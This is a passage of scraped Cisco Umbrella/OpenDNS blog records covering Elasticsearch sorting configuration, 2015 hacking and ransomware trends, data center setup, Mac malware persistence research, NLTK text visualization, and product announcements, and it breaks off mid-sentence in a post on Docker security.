loaded into the cache at the indexing stage by “eagerly” loading the field data. For example, the following template will eagerly load timestamp data for all type ‘log’ documents in “dnslog-*’ indices: curl -XPUT localhost:9200/_template/dnslog_template -d '\n{\n    \"template\" : \"dnslog-*\",\n    \"settings\" : {\n        \"number_of_shards\" : 3\n      \"number_of_replicas\": 1\n    },\n    \"mappings\" : {\n        \"log\" : {\n            \"properties\" : { \"Timestamp\" : {\"type\" : \"date\", \"fielddata\": { \"loading\" : \"eager\" } }, \"URL\" : {\"type\" : \"string\",\n                           \"index\": \"not_analyzed\"},\n                \"IP Address\" : {\"type\": \"ip\"}\n            }\n        }\n    }\n}\n' The size of the field data cache is configured by two variables in the elasticsearch.yml file: indices.fielddata.cache.expire: 1d indices.fielddata.cache.size: 25% Eagerly loading field data can fill memory quickly if it isn’t controlled. These settings give you options for expiring and limiting field data. In most real time search applications, recent data will receive by far the most traffic. So setting the indices.fielddata.cache.expire to 1d will ensure recently indexed data can be sorted quickly, while also ensuring that field data from older data does not fill up memory. In the case where the field data cache does run out of memory, it will evict data using the Least Recently Used Algorithm if necessary. Doc Values Although using in-memory field data is the fastest way to sort, field data can consume a lot of memory. For large enough volumes of data, maintaining an in-memory field data cache may significantly slow down the application or simply be unfeasible. Luckily Elasticsearch provides an alternative to in-memory field data called “Doc Values”. Doc Values is a field data format, essentially the same as in-memory field data, except that it is stored on disk instead of in memory. Enabling Doc Values means more memory for other operations and less garbage collections while only causing a small increase in sorting speed (10-25% according to Elastic). Doc Values is enabled by changing the field data format to “doc_values” in the mapping for the field(s) that will be sorted on. For example: \"log\" : {\n            \"properties\" : { \"Timestamp\" : {\"type\" : \"date\", \"fielddata\": { \"format\": \"doc_values\" } }, \"URL\" : {\"type\" : \"string\",\n                            \"index\": \"not_analyzed\"},\n                 \"IP Address\" : {\"type\": \"ip\"}\n            }\n        } Once the field data format is set to “doc_values”, Elasticsearch will automatically store the field data on disk for each document when it is indexed. It will also automatically start using the on-disk field data for sorting. Minimize Sorting Another option that can potentially reduce the response time of sorted queries is to take advantage of your index schema. For example if indices are partitioned by time period, such as by day or by hour, and results are being sorted on the Timestamp field, there is no need to sort every hit.  It is far more efficient to first query the most recent index, only moving on to the next index if the number of hits of the first query is smaller than the desired number of results. Applying this technique ensures the minimum number of fields are sorted. This sorting technique is not supported by Elasticsearch itself and thus must be implemented by the Elasticsearch Client application. This can be done using a simple “for loop”, taking into account the total hits after each subsequent query. Here is an example using the Elasticsearch java API : public List<Map<String, Object>> SortedQuery(Client c) throws Exception{ Integer limit = 100;\n SearchResponse response; String index; List<Map<String, Object>> results = new ArrayList<Map<String,Object>>(); DateTime time = new DateTime(System.currentTimeMillis ()); int hits; long totalHits; String indexPrefix = \"dns-test-\" ;\n String indexSuffix; // Build a simple query that filters on the \"URL\" field\n  AndFilterBuilder queryFilter =  FilterBuilders. andFilter ();\n  queryFilter.add(FilterBuilders. termFilter ( \"URL\" , \"opendns.com/enterprise-security\" )); while (limit > 0) { // Calculate which index to query using the prefix and suffix\n      indexSuffix = time.toString( \"yyyy-MM-dd-HH\" );\n      index = indexPrefix + indexSuffix;\n      // Execute the query\n      response = c.prepareSearch(index)\n              .addSort( \"TimeStamp\" , SortOrder. DESC )\n              .setSize(limit)\n              .setExplain( true )\n              .setPostFilter(queryFilter)\n              .execute()\n              .actionGet(); // Get the number of hits\n      totalHits = response.getHits().getTotalHits();\n      hits = ( int ) totalHits; if (( long ) hits != totalHits){ throw new Exception( \"Cannot convert from int to long\" );\n      } // Add every hit to the result set for ( int i = 0; i < hits; i++) {\n          Map<String, Object> qResponse =\n                             response.getHits().getHits()[i].getSource();\n          results.add(qResponse);\n      } // Decrement time by one hour to follow an hourly index schema if (hits < limit) {\n          time = time.minusHours(1);\n      } // if hits is equal to or greater than limit, return else { return results;\n      } // update the limit since we have already found some \"hits\"\n      limit = limit - hits;\n  } return results;\n} This function is meant to execute a sorted query on one index at a time in reverse chronological order, starting with the index corresponding to the current time. At the end of each loop, time is decremented by one hour in order to following an hourly index schema. Conclusion Elasticsearch has shown that it can be configured to competently search log data without wastefully scoring and sorting results. Additionally, by querying only the required indices and properly storing field data, Elasticsearch can return sorted queries fast and efficiently. In Part 4 of this series, we will explore more advanced techniques and configuration in Elasticsearch that can take your cluster to the next level. Continue to: Elasticsearch: You Know, For Logs [Part 4] .", "date": "2015-05-12"},
{"website": "Cisco-Umbrella", "title": "2015: The Year Hacking Got Personal", "author": ["Owen Lystrup"], "link": "https://umbrella.cisco.com/blog/2015-the-year-hacking-got-personal", "abstract": "This Attack Feels Different Following the Ashley Madison hack in July 2015, Troy Hunt — the security expert who runs HaveIBeenPwned.com — started receiving inquiries and pleas from people worrying about whether or not their names and e-mails would be found in the database hackers published online. For some, the hack sparked deep seeded feelings of guilt and remorse. Some registered users even admitted considering the worst . “I have contemplated suicide daily for the past week,” one person e-mailed to Hunt. “My two beautiful children and my wife are keeping me alive. I am very worried that her family and others will find out, making it extremely difficult for her to stay with me.” The motivations behind this attack seemed different than just a commonplace data grab. It was more personal, intending at first to do serious damage to Ashley Madison and its reputation. But because of the site’s purpose, the hack had a devastating effect on affected users. Names, e-mail addresses, credit card information, purchase history, search queries, and profile information were all published online for anyone in the world to search. People could easily find friends, colleagues, family members, spouses, or even enemies and conclude they were cheaters, even if that was not the case. Suddenly careers, relationships, and families were jeopardized as a result of trusting a site that promised privacy — something we all do every day. 2014: The Year of the Breach as Usual While Target was still going through settlement proceedings in the aftermath of its huge data breach in 2013, hackers hit Sony Pictures, Home Depot, JP Morgan Chase, Spotify, Neiman-Marcus, CHS Community Health Systems, Staples, Michael’s, and eBay (not to mention dozens of others), causing the media and the security community to label 2014 the year of the breach. It was the year every corporation in the world woke up to the dire state of security. But the motive for these attacks — with the exception of Sony — made logical sense, as the economic rewards were direct and immediate. Grab as much data as possible; then sell it to the highest bidder. The hackers involved were mostly out to make a buck, not ruin lives. And while individual users, consumers, and shoppers might have gone through the annoyance of needing a new credit card or a password reset, the effects of losing personal data in a massive breach never hurts in the same exigent sense of what happened throughout 2015. The hacks witnessed this year — though the large data grabbing hacks also continued — hit an intimate level. 2015: The Year of Extortion Though Ashley Madison provided a yet unseen case study in what can happen when the incriminating details of millions of individuals’ lives get published online, monetary gains were still very much a motivation for hackers in 2015. Shortly after the attack, extortionists began to send threats of notifying the spouses and friends of individuals found in the leaked database, unless they received a Bitcoin payment. Ransomware also amplified to an astounding level . McAfee estimated the number of attacks in the third quarter of 2013 at 1.5 million. In the second quarter of 2015, that estimate was 4 million, with 1.2 million of the attacks being totally new. The rapid popularity growth is likely due to the cheap and effective nature of ransomware attacks. Hackers now only need to spend a marginal amount of capital to set up an infrastructure, and the returns can be large. Ransomware attacks strike fairly indiscriminately, hitting both companies networks and individuals alike. Once in, the exploits are written to deliberately encrypt files that are likely irreplaceable. Victims through no fault of their own suddenly risk losing videos and photos of their first born, or the last trip to see Grandma, or the important tax files needed for next year’s return. Some of the latest variants of attack even add insult to injury , mocking victims with a taunting pop-up message once files are encrypted. Unfortunately, these attacks work often enough to encourage attackers to persist. Hitting individuals and corporate networks alike, ransomware has become so effective that an FBI agent speaking at a security conference this year admitted to suggesting that victims just pay the ransom to avoid losing access to files forever. There are precautions (like backing up files to the cloud) that can help protect against losing data, and security companies are pitching in to provide tools that can help decrypt locked files. This is great news for infected computers, but security and cryptology experts are already imagining a future in which people are faced with the dilemma of paying a ransom to get your car to start in the morning or watch Netflix on a smart TV. That imagined future might already be on the doorstep. IoT: Insecurity at Work, at Home, and on the Road In June researchers OpenDNS Security Labs published a report examining the security of various Internet of Things (IoT) devices, after finding that all of the devices examined had a vulnerability of one kind or another. It’s becoming clear that security is often an afterthought for IoT device manufacturers and software developers. Also in 2015, researchers Chris Valasek and Charlie Miller demonstrated the very real possibility of disabling a car while its being driven; a Barbie doll showed it could be used to spy on children; vulnerabilities in apps from VTech breached millions of images and voice messages of children (luckily they were not published); researchers at Rapid7 demonstrated that nine publicly available baby monitors were vulnerable to attack; and security expert Billy Rios was hired by the Mayo Clinic to hack medical equipment currently deployed in hospitals to find out which devices vulnerable — all of them were hackable. It seems the forewarnings of the risks embedded devices bring to the workplace, and into our homes and lives, are already too late. IoT is hackable, and they are already present in everyday life. How We Turn the Tide If attacks are getting more personal, we must all start taking security personally. Though it was a challenging year in a lot of ways, 2015 is also seeing a lot of positive progress in security. Researchers advanced their detection methods and threat intelligence models. Industry experts are starting to collaborate more, as are government entities from different nations . The US government has decided to start taking security seriously . Encryption now owns a front-and-center role in the dialog about the future of security . Security companies are having success finding and mitigating large scale attacks that affect millions. And two-factor authentication is becoming a standard for vendors. Captured from Pastebin. Even a ransomware author has shown a change of heart, posting an apology and decryption details to Pastebin. But there is still much work to do. All the efforts of the smartest security experts in the world, and the billions of dollars invested in safety for online users and their devices cannot save an ignorant Internet populace. We are reaching a critical point for individual Internet users to accept some responsibility for their own security and apply common sense with their decisions about trust, password management, financial transactions, and what to post online. There is no question; the hacks that occurred this year were alarming. But as the Internet will only increase its role in our daily lives, it’s imperative to keep up the fight in 2016 and beyond.", "date": "2015-12-10"},
{"website": "Cisco-Umbrella", "title": "Better malware protection for all OpenDNS Enterprise customers", "author": ["David Ulevitch, Founder/CEO"], "link": "https://umbrella.cisco.com/blog/opendns-enterprise-malware-protection-is-awesome", "abstract": "Starting this week OpenDNS Enterprise has become an even more powerful anti-malware solution. It will block more forms of malware, and make networks around the world much more secure from costly malware infections. In addition to blocking malicious hostnames, we now block hostnames that resolve to known malicious IP addresses. That’s a big step forward, so I’ve added some notes on why this an important step for us. First, some background: OpenDNS Enterprise malware protection is unlike anything else available. It’s a game-changing service for network admins tasked with keeping malware off their networks. It’s the first and only product that serves the two critical needs in fighting malware: blocking infections and mitigating compromised hosts. Here are three excellent reasons you should consider using it: Reason #1: Disable, Don’t Just Try to Detect Mainstream anti-malware services from traditional companies like Microsoft and Symantec do little or nothing once a machine is infected to mitigate the damage that the malware causes. OpenDNS Enterprise malware protection, on the other hand, works to both prevent and mitigate malware. Since you can be infected through a variety of non-network vectors (USB stick, attachments, etc.) we also work to prevent infected computers from phoning home by blocking the master command and control servers that the malware communicates with. Reason #2: Do You Run a Firewall or Anti-Spam System? Some businesses sometimes ask me why they need OpenDNS. I ask them, “Do you have a firewall? Do you have a mail server with anti-spam and anti-virus enabled? Do you run an IDS system?” They invariably answer “yes” to all three questions. So then I ask, “Why do you leave your DNS traffic open like a firehose? Don’t you want to let in the good and block the bad?” Most network administrators and IT folks have never considered that problem, but once they do; the choice to use OpenDNS is clear. Reason #3: Malware is a Major Problem For You, Whether You Realize it or Not Malware is a massive problem, and one that’s growing fast. Stats from security firm Dasient show the number of websites infected with malware doubling since last year, with more than one million sites compromised during the fourth quarter of 2010. Another study from Microsoft shows that one in every fourteen programs downloaded by Windows users are malicious. And despite IE’s built-in warnings, 5% of people download the files anyway. Stopping infections is only part of the solution, the other part requires OpenDNS. Interested? Existing OpenDNS Enterprise customers are getting this functionality today at no additional cost and with no additional effort on their end. Not yet a customer? Our clueful OpenDNS Enterprise sales reps would love to tell you more about it and get you started with a free trial today. Lastly, our innovations have been noticed by the experts — Fahmida Rashid over at eWeek writes, OpenDNS Launches DNS-Based Malware Protection Service for Enterprises, and Kelly Jackson Higgins over at Dark Reading writes, Using DNS As Malware-, Botnet-Fighting Tool. PS, DNS hero and creator of BIND, Paul Vixie was quoted as saying that as long as malware continues to rely on DNS, tools like OpenDNS Enterprise malware protection will “be able to curtail it.”", "date": "2011-06-21"},
{"website": "Cisco-Umbrella", "title": "The Six Easy Steps to Set Up a Global Cloud Infrastructure", "author": ["Owen Lystrup"], "link": "https://umbrella.cisco.com/blog/setting-up-a-global-cloud-infrastructure-in-six-easy-steps", "abstract": "The Internet is now synonymous with relentless growth. More Internet users are going mobile as their primary choice of access. Cloud infrastructure is becoming astronomically more popular among developers and operations engineers. More services are offering APIs to connect to other services. And IoT is going to bring 50 billion devices online by 2020, according to Cisco . Just 10 years ago, the Internet had 1 billion users according to an Internet Society report released last year. Today, the same report estimates it is closer to 3 billion. And this growth is happening all prior to the majority of the world’s population even being connected to the Internet. A McKinsey report estimates as much as 60 percent of the world is not even online yet, putting the figure at 4.2 billion people without Internet access. As the Internet’s growth progresses, interconnectivity becomes even more important. Many Internet users still do not fully understand how the network that provides their favorite services — like Snapchat messages, YouTube videos, or access to their bank — is largely a physical thing . The Internet in its most modern form is still thousands of miles of wrapped cable converging at certain geographical spots in the world to pass packets back and forth between companies, service providers, CDNs, and eventually to consumers. Getting Facebook, Pinterest, Instagram, and all the other tech giants, connected physically is not an easy task. The same goes for providing an Internet-based security service. In April of this year, OpenDNS opened a new data center in Johannesburg, South Africa . The location addition means providing companies and customers with a connection point in Africa, rather than routing traffic through Europe. As a result, OpenDNS engineers estimated the subsequent latency improved from a few hundred milliseconds, to just a few milliseconds RTT. Much like launching a new UX project or developing a new app, the launch was a culmination of immense pre-work. OpenDNS Engineering Manager Jennifer Basalone says this process is always how it goes with establishing data centers. Having set up five data centers for OpenDNS, and building on experience doing the same work at Facebook, Basalone is more than well versed with the whole process. Before a company can just drop a router into an Internet exchange (IX) and start peering with other companies to deliver service, a lot of vetting, research, and negotiation needs to be finished. Basalone outlined it into six major steps — all of which could of course be broken out into dozens of sub-steps. 1. Find a good IX According to Basalone, it’s not quite like throwing a dart at a map of the globe. There are many considerations involved, like costs of operation, deployment issues, legal and tax considerations, allowance for private peering, security needs, data handling needs, the type of peers available in the IX, and quite a few others. Mainly, the goal is to find an IX with good neighbors so you can get customers closest to the providers of content they want. A map of Internet exchange locations from datacentermap.com 2. Find what data center hosts that IX This step is fairly straightforward, and will set the base for the needed research that follows. 3. Research the costs A country’s stability, tax laws, and data privacy laws — among others — are all under consideration. The goal here is to “make sure [the targeted country] is not a US embargoed country,” Basalone said. “Then you really want to make sure the country is stable. And then look at the taxes that are involved.” Now is also a good time to start looking at arbitration and service level agreements from the various providers involved to answer fundamental questions. For instance, can the data center provide the amount of power required to host enough servers and routers? Can it handle the amount of estimated traffic? Is there staff ready and available to help with outages 24/7? Each country is different, and each country carries its own challenges. Brazil, for instance — a country OpenDNS does not currently operate in — reportedly has some fairly challenging import laws and taxes, being a country that likes to encourage as much local business as possible. Along with country-specific taxes and the cost of the actual equipment, there are import fees, monthly management costs, port and airport taxes, regional taxes. The list is extensive, Basalone said. 4. Pre-configure equipment and ship Once all the costs are estimated, space is planned out, and a service agreement is vetted by legal and signed by both parties, it’s time to prep the equipment. Each router, switch or whatever other box required, needs to be booted, configured, and ready to ship out to location. Once shipped, things can sometimes get complicated. The longer equipment takes to ship, or is stuck in customs, for example, the more security becomes a concern. “You can have equipment stuck in customs for 100 to 200 days, and not know when it will come out,” Basalone said. “Companies will sometimes even do three separate shipments and hope one makes it. The longer time it is en route, the higher chance it has of being stolen.” 5. Go Live Once all the equipment has (hopefully) arrived safely, having gotten through complex customs laws, it’s time to send someone out to stack, rack, and bring it all online. But even then, it’s still not entirely a sure thing that the process will go smoothly. “Even if all the shipping and equipment setup works, nothing is going to come online until the transit provider comes online,” Basalone said. Even choosing a transit provider alone can come with many considerations and sticking points. For Basalone and her team, a data center go live date is a stressful and exciting time. It typically involves multiple engineers from different teams and locations, all working together to create an entirely new connection across the globe. “We all get together and sit in a chat room,” Basalone said. “And the network team lets us know our transit providers are online. Then we can bring our servers online.” As far as the tools of the trade, Basalone’s team uses a host of them. “Our engineers use a wide variety of tools like Ansible, Puppet, NetHarbour , custom automation, and other provisioning support systems to automate as much of the build as possible,” she said. 6. Announce to the world “Once everything is online, looks good, and everything’s a go, we request our awesome network engineering team enable anycast for the site,” she said. “At that point our anycast routes are announced in BGP from the new location and traffic will start flowing to our new data center.” Along all six of these “simple” steps are minefields of issues that can cause the process to halt, or at least delay. Basalone said that is the number one thing her team tries to avoid when getting a data center live. “Bringing up the site takes a couple of teams, so you don’t want to waste their time,” she said. “Having everything set up and well coordinated makes the process go a lot smoother.” Sound pretty easy? Didn’t think so. To learn more about OpenDNS’s engineering team and its progress, visit their blog here .", "date": "2015-09-09"},
{"website": "Cisco-Umbrella", "title": "The Empty OS X Security Toolbox: Mac Malware Persistence Is Scary Easy", "author": ["Owen Lystrup"], "link": "https://umbrella.cisco.com/blog/the-empty-os-x-security-toolbox-mac-malware-persistence-is-scary-easy", "abstract": "As illustrated recently , Apple is growing its share of the PC economy, making it inevitable for attackers to  target Mac users more. To prevent getting caught, malware needs to maintain persistence. And in OS X, it’s incredibly easy. Most major antivirus software companies have an offering for virus and malware detection in OS X. Sophos, eSET, Symantec, Bitdefender, and others all offer scanning and detection for Mac. However, Synack, Inc. Director of Research Patrick Wardle displayed at RSA 2015 how he built a practical test to see which malware solutions were up to the task. Results were pretty startling. None of them caught his malware. Not one of the major antivirus or anti-malware companies’ solutions alerted to–let alone blocked–its install or the malware’s persistence. The only major provider Wardle did not test was McAfee, he said. Malicious persistence is essentially the act of making code, scripts, or apps launch or execute after rebooting, and not getting caught. This is essential to malware, because malware foiled by rebooting would be mostly useless. Apple’s Built-In Protection Apple has a number of malware and virus protections written into OS X, which is part of why Macs are typically regarded as safer than Windows machines. But it’s also due to Apple’s marketing and an incorrect mindset. “Apple use to have a slogan on their web sites that said ‘Macs don’t get viruses,’ [which is] not true,” Wardle said. “They just don’t get PC viruses.” Without going into each one of a Mac’s built-in security features in detail, the components in question are: Gatekeeper , Xprotect , OS X (app) Sandbox , and code signing . There are other security features in OS X as well. Mac firewall , F ilevault , and Parental Controls are some examples . These protections operate at different levels to prevent attackers or malicious software from doing things they’re not supposed to. Wardle’s research is disconcerting because the exploits found in it affect the most basic levels of OS X. Apple’s Built-In Fail Some of these built-in defenses need merely an OS settings change, recompiling of a kext entry, or a change in an app’s name to allow the malware to install, get root access, and persist despite updates or reboots. As a single example, of the 20 or so scenarios Wardle demonstrated, is getting a malicious app to run but appear legitimate. And in OS X it’s easy. How easy? “It’s trivial,” Wardle said. Apps that run in OS X have a hash that verifies their legitimacy. Apps are signed through the development process using a developer’s key. Unlike in iOS, OS X allows apps that are unsigned to run without blocking them. So how does an attacker compromise an app and make it look legitimate to the OS? Simply remove the signature. Image from Virus Bulletin. Wardle explained how easy it is for attackers to bypass the app signing feature. In fact, the change required is so easy that high school students explained how it works (in Windows) during BSides Huntsville . Just one example method is to remove the signature from what’s called the LC_CODE_SIGNATURE block in a kext file, which essentially turns off the signature verification. Recall the car key analogy. When an attacker can unsign an application like Safari–for example–using this technique, it’s like not even needing a key to start the car’s engine. “This is a rather big security issue,” Wardle said in his written report . “As any signed application can be unsigned, then infected with viral code, and [it] will still be allowed to execute.” Though most users might say they have never had a virus on a Mac, assuming this is all possible and easy as it seems, the scary part is they might have and would never know it. Again, this was just one of Wardle’s exploit examples. One out of 20 or so others. How to Protect Your Mac If everything Wardle demonstrated is true, and the major antivirus providers do not have an adequate solution to detect simple but dangerous attacks like privilege escalation, software hijacking, rootkit installs, and so one, enterprises with a Mac population should esure they are equipped to monitor network traffic properly. Most malware detection operates primarily by some sort of hash checking or inspection. Like in the methods described earlier, if attackers can change hashes quickly and fairly effortlessly, malware detection scanners likely won’t catch them. Wardle has written a couple of custom tools to help with this and other OS X security flaws. And this year he debuted a UI for the tool, which originally had to run via a Python script in Terminal. “ Knock Knock ” and “ Block Block ” are tools Wardle says can detect when malware is installed or trying to persist in the operating system. If these tools work well, they could be a dire addition to monitoring for and preventing harmful malware changes and attacks. Pairing the two with scrupulous network traffic monitoring and enforcement would yield useful indicators of any odious activity on OS X hosts. Though they might not be perfect, proper use of the security precautions that are there–like Gatekeeper, Filevault, the Mac firewall, and File Quarantine–and other tools like Little Snitch couldn’t hurt. Also, keep the antivirus. Though most or all solutions are circumventable, they will catch more than not having any at all, even if just barely.", "date": "2015-04-24"},
{"website": "Cisco-Umbrella", "title": "The Hacker's Manifesto Revisited", "author": ["Thibault Reuille"], "link": "https://umbrella.cisco.com/blog/hackers-manifesto-revisited", "abstract": "Another one got caught today, it’s all over the papers. “Teenager Arrested in Computer Crime Scandal”, “Hacker Arrested after Bank Tampering”… Damn kids. They’re all alike. You may have recognized the opening lines of this now legendary text. The Hacker’s Manifesto, first published in Phrack #7 in 1986, was written by “The Mentor” shortly after his arrest. It is now part of the common hacker knowledge and stays a monument of the cyber culture. Today, we would like to give it a new lease on life using OpenGraphiti , our data visualization engine. In this article, we will present you a way to do some text analysis with OpenGraphiti combined with NLTK, the Natural Language Toolkit. First let’s have a quick look at what NLTK is and does : NLTK is a leading platform for building Python programs to work with human language data. It provides easy-to-use interfaces to over 50 corpora and lexical resources such as WordNet, along with a suite of text processing libraries for classification, tokenization, stemming, tagging, parsing, and semantic reasoning, and an active discussion forum. (Source : http://www.nltk.org ) In other words, NTLK is a text processor for human languages such as English, Spanish, French, Chinese … We will use it to parse our Hacker’s Manifesto and analyze the output with OpenGraphiti. This will bring a new light on the structure of that text and the way NLTK parses words and sentences in a unique and visual way. Obviously, this technique can be very well applied to any other text, our use case here only serves as an example. Parsing the text with NLTK Now we will assume that you have NLTK installed on your machine and that you have a file called “manifesto.txt” containing the text to process. The relevant Python code to parse your text data looks like this : data = list()\n    with open(\"manifesto.txt\", \"rU\") as infile:\n        text = infile.read()\n        print(\"Parsing sentences and tagging words with NLTK ...\")\n        sentences = nltk.sent_tokenize(text)\n        for sentence in sentences:\n            tokens = nltk.word_tokenize(sentence)\n            tagged = nltk.pos_tag(tokens)\n            data.append(tagged)\n        print(tagged) Fairly straightforward indeed : Open the file, read it. Cut the text into sentences Foreach sentence, cut it into words Tag the words with an NLTK type Print the result In order to illustrate NLTK’s mechanism, let’s just focus on this sentence : Have you ever looked behind the eyes of the hacker ? Did you ever wonder what made him tick, what forces shaped him, what may have molded him ? For that specific sentence, here is what NLTK would give us : [('Have', 'NNP'), ('you', 'PRP'), ('ever', 'RB'), ('looked', 'VBN'), ('behind', 'IN'), ('the', 'DT'), ('eyes', 'NNS'), ('of', 'IN'), ('the', 'DT'), ('hacker', 'NN'), ('?', '.')]\n    [('Did', 'NNP'), ('you', 'PRP'), ('ever', 'RB'), ('wonder', 'JJR'), ('what', 'WP'), ('made', 'VBN'), ('him', 'PRP'), ('tick', 'VBP'), (',', ','), ('what', 'WP'), ('forces', 'NNS'), ('shaped', 'VBD'), ('him', 'PRP'), (',', ','), ('what', 'WP'), ('may', 'MD'), ('have', 'VB'), ('molded', 'VBN'), ('him', 'PRP'), ('?', '.')] As you can see, the whole text has been cut into sentences. Those sentences are represented by arrays of words. Each word is represented by a pair of elements. The first one is the word, the second is the NLTK type. Now how do we know what they mean ? Well, NLTK provides a very simple way to read the documentation about those types. For example, let’s focus on the tag associated with the word “looked” in the first sentence. (VBN) $ python >>> import nltk >>> nltk.help.upenn_tagset('VBN') VBN: verb, past participle\n        multihulled dilapidated aerosolized chaired languished panelized used\n        experimented flourished imitated reunifed factored condensed sheared\n        unsettled primed dubbed desired ... Fair enough! NLTK gives us a code to communicate the type/function of a word in a sentence. Now all we have to do is use SemanticNet to transform our tagged tokens into a nice graph. Build the graph The process is fairly simple, we will just parse all the sentences and create a connected path between the succession of words in the sentence. If a word or edge has already been created, we don’t recreate it. If we apply this on the whole text, this will give us a graph of words connected when they appear next to eacher in the text. And finally we can type them with the NLTK tag. Example : “NLTK is amazing. OpenGraphiti is great too.” This will be parsed and tagged like this : [(u'NLTK', 'NN'), (u'is', 'VBZ'), (u'amazing', 'VBG'), (u'.', '.')]\n    [(u'OpenGraphiti', 'NNP'), (u'is', 'VBZ'), (u'great', 'JJ'), (u'too', 'RB'), (u'.', '.')] We can then create a graph defined as follows : Nodes : NLTK, is, amazing, ., OpenGraphiti, great, too\n    Edges :\n        NLTK --> is,\n        is --> amazing,\n        amazing --> .,\n        OpenGraphiti --> is,\n        is --> great,\n        great --> too,\n        too --> . Let’s take a look at our creation algorithm using SemanticNet to perform that task. import semanticnet as sn\n    graph = sn.DiGraph()\n    for sentence in data:\n        previous = None\n        for token in sentence:\n            word = token[0].lower()\n            type = token[1]\n            if not graph.has_node(token[0]):\n                current = graph.add_node({ \"label\" : word, \"type\" : type}, word)\n            else:\n                current = word\n            if previous is not None:\n                edges = graph.get_edges_between(previous, current)\n                if not edges:\n                    graph.add_edge(previous, current)\n            previous = current\n    graph.save_json(\"manifesto.json\") Notes We use the lower() method to transform everything in lowercase. ( OpenGraphiti and opengraphiti would be treated equally) We don’t make the distinction between different types on the same word. We keep whichever appears first. Going further We could spice things up a little bit. For instance, we could count the number of occurrences of each edge. That would give us a Markov graph of all the word transitions. That can also be visualized. Another idea is to create a timeline to play the text over time and simulate it as if it was spoken in realtime! Visualization Once our SemanticNet graph has been created, we can visualize it with the OpenGraphiti engine : $ ./graphiti demo manifesto.json We can now contemplate the result in three dimensions! We captured a video of the engine in action and we are happy to share it with you. This video first shows you the resulting graph created with the technique described above, and then plays the text over time. We hope you enjoyed this tutorial. This use case hilights an interactive way to dig into the NLTK parser mechanism. It could very well be applied to other language parsers or text processors. It is only a simple use case to expose how we can explore complex semantic data with a little bit of Python and the OpenGraphiti framework! References OpenGraphiti project : http://www.opengraphiti.com The Hacker’s Manifesto : http://phrack.org/issues/7/3.html Markov Chain on Wikipedia : http://en.wikipedia.org/wiki/Markov_chain", "date": "2014-08-28"},
{"website": "Cisco-Umbrella", "title": "New dog, new tricks", "author": ["Kevin Rollinson"], "link": "https://umbrella.cisco.com/blog/introducingsig", "abstract": "We’ve all heard the saying: You can’t teach an old dog new tricks. But have you ever tried? I know, I know, you didn’t come here for canine training tips. Stay with me, there’s a point to all this. Anyways, it’s super hard. I tried, and all the dog wanted to do was sleep. Your best bet? You guessed it — getting a new dog. The same thing was happening in security. New problems were arising — more roaming workers, apps and infrastructure moving to the cloud, and branch offices connecting directly to the internet — and the old tricks weren’t cutting it. Enter new dog Today, we’re excited to announce Cisco Umbrella, the industry’s first Secure Internet Gateway (SIG) in the cloud. What is a SIG, you ask? Good question. A SIG provides safe access to the internet anywhere users go, even when they are off the VPN. Before you connect to any destination, a SIG acts as your secure onramp to the internet and provides the first line of defense and inspection. Regardless of where users are located or what they’re trying to connect to, traffic goes through the SIG first. Once the traffic gets to the SIG cloud platform, there are different types of inspection and policy enforcement that can happen. You’re probably thinking “Hey! that sounds like the stuff you guys have been doing for years!” and you’re not entirely wrong. We’ve taken the functionality and proven platform from OpenDNS and used it as the starting point for designing our SIG. But here’s where things get taken to a new level. We’ve taken other technology from across the Cisco portfolio and reimagined how it could be integrated together in order to deliver an even broader range of coverage of malicious destinations and files and better intelligence, while maintaining and improving our openness and simplicity. Stop more threats To prevent more threats, we’ve added the ability to inspect files. Using a combination of AV engines and Cisco Advanced Malware Protection (AMP), Umbrella now inspects files that are attempted to be downloaded from risky domains — providing additional protection for your organization. Our intelligent proxy was also re-architected using microservices to automatically scale for even better performance. Making our intelligence more intelligent We know the bad guys will try new methods, so we are constantly tuning and developing new statistical models to help uncover attacks before they launch. We’ve added two more, including one that predicts domains that will be used in future spam campaigns , and one that automates the reverse engineering of domain generation algorithms (DGAs) to predict thousands of future malicious domains. We’ve created additional security categories to give organizations the flexibility to block potential threats sooner. And you can now create custom URL blocklists based on your local intelligence for more granular control and the ability to extend protection beyond your perimeter. Keep it simple, keep it open We want every interaction between you and our technology to be intuitive, meaningful, and ultimately, a delight. We know some of your biggest needs in the Umbrella dashboard revolve around setting up policies, finding infected devices, and identifying security trends within your organization. We’re revamping our user interface to improve policy configuration and provide more extensive reporting options. We’re introducing a new policy wizard that dynamically updates depending on what type of policy you want to create or change. When you’re creating new policies, not only does it walk you through every step of the policy configuration with a simple question-based flow, but you can also use our policy tester before implementing to ensure it will be applied as you intended. For reporting, we’ve revamped the design to help you find key information faster and make reports easier to share. Now, it’s even easier to know what to focus on. Since day one, we’ve built Umbrella to be a product that integrates and works closely with all types of technologies and platforms — including security appliances, intelligence platforms or feeds, and custom, in-house tools. Now, Umbrella integrates with Cisco Wireless LAN Controllers to gain broad visibility and protection across your wireless environment. Additionally, Umbrella together with CloudLock offers discovery and control for use of SaaS apps. If you’ve been with us awhile, we’re excited for you to experience all the new features and functionality we’re adding to Umbrella. If you’re new (welcome!), we encourage you to try Umbrella , and see first hand the power of simple and effective cloud security. For more information on the Secure Internet Gateway product category , check out Brian Roddy’s blog at: blogs.cisco.com/security/cisco-umbrella-secure-internet-gateway .", "date": "2017-02-09"},
{"website": "Cisco-Umbrella", "title": "Considering Docker? Consider Security First", "author": ["Owen Lystrup"], "link": "https://umbrella.cisco.com/blog/considering-docker-consider-security-first", "abstract": "Containers started making a big splash in IT and dev operations starting in 2014. The benefits of flexibility and go-live times, among many others, are almost undeniable. But large enterprises considering using a container platform for development or IT operations should pause and consider security first. Last year DataDog , an IT infrastructure monitoring company, surveyed 7,000 companies and found that Docker adoption was up fivefold from 2014 to 2015. If true, the adoption rate for using containers as opposed to virtual machines and hypervisors to run apps is rather unprecedented for enterprises large and small. The survey also found that two-thirds of companies that evaluate Docker, end up adopting it. Docker is a platform that allows IT sys admins, software developers, engineers, or anyone needing to publish a piece of code or software, to compartmentalize apps along with their code libraries and executable files into what are called containers. Rather than use an entire OS instance like Windows to run one application on a virtual machine, container platforms like Docker can use far fewer resources, a single OS, and containers to keep processes separate from one another, and thus far more efficient. Containers certainly have a large number of benefits for IT and dev ops, such as fewer virtual machines and OS instances to patch and update, fewer hardware boxes to house and maintain, rapid application deployment (really rapid, like seconds in most cases), easy version control, easy sharing, and so on. However, there is speculation from some that containerization — to use such a Franken-term — is not ready for large enterprise use. Much of that speculation comes from both the previous security issues that plagued Docker ’s early days, and the fact that it is such new technology that has not been hardened through widespread use. Of course there are security issues At RSA 2016 Securosis Contributing Analyst David Mortman led a session on security for Docker, and quoted Red 